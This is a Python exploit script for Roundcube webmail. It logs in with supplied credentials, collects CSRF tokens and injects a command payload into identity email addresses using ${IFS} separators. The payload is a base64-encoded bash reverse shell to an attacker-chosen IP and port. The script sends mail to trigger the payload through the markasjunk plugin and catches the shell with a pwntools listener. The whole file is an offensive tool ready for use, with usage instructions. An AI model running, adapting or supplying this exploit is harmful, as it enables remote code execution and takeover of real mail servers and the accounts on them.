#!/usr/bin/python3

import requests, sys, re, base64, random, time
from http.cookies import SimpleCookie 
from urllib.parse import quote
from simple_colors import *
from threading import Thread
from pwn import * 

context.log_level='critical'

s = requests.session()

header = None
token = None
# Login function is for getting Cookie and other stuff
def make_session():
    global token
    request = s.get(f'http://{victim}/?_task=login')
    ltoken = None
    for line in request.text.split("\n"):
        if 'name="_token"' in line:
            ltoken = line.split("value=")[1].split('"')[1]
            print('[+] Login Token Obtained: ', blue(ltoken, ['bold'])) #THis token is for the login

    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = f"_token={ltoken}&_task=login&_action=login&_url=_task%3Dlogin&_user={user}&_pass={passwd}"
    login = s.post(f'http://{victim}/?_task=login', data=data, verify=False, headers=header, allow_redirects=False)
    stablish = s.get(f'http://{victim}/?_task=mail&_token={ltoken}')
    for line in stablish.text.split("\n"):
        if 'name="_token"' in line:
            token = line.split("value=")[1].split('"')[1]
            print('[+] CSRF Token Obtained: ', blue(token, ['bold'])) # and this token is for CSRF :D
    delivery_payload_and_exploit(token)


    
       
def delivery_payload_and_exploit(token):
    global header
##################  payload creation using bash one liner in b64  ##################
    rev = f'bash -i >& /dev/tcp/{localhost}/{port} 0>&1' # Can be adapted for others S.O or enviroments :p
    rev = base64.b64encode(rev.encode('utf-8')).decode('utf-8')
    payload = f'pwnshell&echo${IFS}{rev}|${IFS}base64${IFS}-d${IFS}|${IFS}bash&@foryou.com' #IFS = ' ' blank or space xd
    encoded_payload = quote(payload)
    print("[+] Payload crafted!") 
    time.sleep(2)

################### Get Identitites IDs for#####################

    get_id = s.get(f'http://{victim}/?_task=settings&_action=identities', headers=header)
    id_matches = re.findall(r'id="rcmrow(\d+)"', get_id.text)

##################   edit new the id for inject payload xd  ##################  
    print('[+] Editing new ID')
    token = token
    header = {'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': '; '.join([f"{name}={value}" for name, value in s.cookies.items()])}
    for id_mail in id_matches:
        new_id = f"_token={token}&_framed=1&_task=settings&_action=save-identity&_iid={id_mail}&_name=&_email={encoded_payload}&_organization=&_reply-to=&_bcc=&_signature="
        id = s.post(f'http://{victim}/', data=new_id, headers=header, verify=False)
        print('[󰇴] Payload Injected')
    
   
    for id_number in id_matches:
        if int(id_number) < 20:
            mail_compose_id = s.get(f'http://{victim}/?_task=mail&_action=compose', headers=header, allow_redirects=False)
            if mail_compose_id.status_code == 200 or 302:
                headers_req = mail_compose_id.headers
                location = headers_req.get('Location')
                shoot_number = random.randint(0, 1337)
                composer_id = location.split('_id=')[1]
                sent_mail_data = f'_token={token}&_task=mail&_action=send&_id={composer_id}&_attachments=&_from={id_number}&_to={user}&_cc=&_bcc=&_replyto=&_followupto=&_subject=Pwn&_draft_saveid=&_draft=&_is_html=0&_framed=1&_message=Shoot{shoot_number}&editorSelector=plain&_mdn=&_dsn=&_keepformatting=&_priority=0&_store_target=Sent'
                pizza_delivery = s.post(f'http://{victim}/?_task=mail', headers=header, data=sent_mail_data)
                if pizza_delivery.status_code == 200 or 302:
                    print('[+] p1zza being delivered...')
                else:
                    pass                
            else:
                pass
                exit            
        elif int(id_number) > 10:
            pass
        else:
            print(f"[!] s0mething its wrong... or {id_number} wasn't found")
            quit           
            
    
def shoot():
    global header, token
    header['X-Roundcube-Request'] = token
    data='_uid=*&_mbox=Sent&_remote=1'
    shoot = s.post(f'http://{victim}/?_task=mail&_action=plugin.markasjunk.junk', headers=header, data=data)
    time.sleep(2)
    
    
if __name__ == "__main__":
    if len(sys.argv) != 6:
        print(blue("""
    [-] Usage: ./exploit <victim host> <usermail> <userpassword> <reverse ip> <reverse port> \n
    example: ./exploit vulnerablehost.com pwned@user.pwn PwnPassword! 127.0.0.1 1337
        """))
        sys.exit(1)
    
    victim = sys.argv[1]
    user = quote(sys.argv[2])
    passwd = quote(sys.argv[3])
    localhost = sys.argv[4]
    port = sys.argv[5]
    IFS = '{IFS}'

    make_session()

    Thread(target=shoot).start()
    print(red("\n[󰇴] = h1er k0mmt d1e s0nne [󰇴]\n"))
    shell = listen(port, timeout=30).wait_for_connection()
    shell.interactive()

    
